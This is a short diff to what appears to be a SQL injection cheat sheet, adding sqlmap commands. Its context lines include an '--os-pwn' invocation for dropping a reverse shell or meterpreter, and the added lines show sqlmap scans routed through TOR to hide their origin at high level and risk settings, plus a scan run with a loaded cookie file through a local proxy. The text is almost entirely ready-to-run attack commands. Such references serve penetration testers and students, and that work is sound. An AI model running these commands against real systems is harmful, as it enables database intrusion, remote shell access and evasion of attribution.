@@ -138,6 +138,18 @@ Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
 ```
 
+Using TOR with SQLmap
+
+```powershell
+sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
+```
+
+Using Chrome cookie and a Proxy
+
+```powershell
+sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
+```
+
 Using suffix to tamper the injection
 
 ```powershell
